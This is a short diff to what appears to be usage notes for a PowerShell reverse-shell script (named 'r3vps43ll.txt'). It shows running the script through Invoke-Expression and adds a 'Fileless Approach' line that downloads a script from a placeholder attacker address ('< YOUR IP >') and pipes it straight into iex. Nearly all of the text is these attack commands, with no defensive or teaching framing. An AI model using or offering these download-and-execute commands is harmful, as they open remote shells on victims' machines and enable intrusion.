@@ -17,3 +17,7 @@
  Run it like this in PowerShell:
  
  gc -raw .\r3vps43ll.txt | iex
+
+# Fileless Approach
+
+(iwr 'http://< YOUR IP >/< DIRECTORY >/filename.txt' -UseBasicParsing) | iex
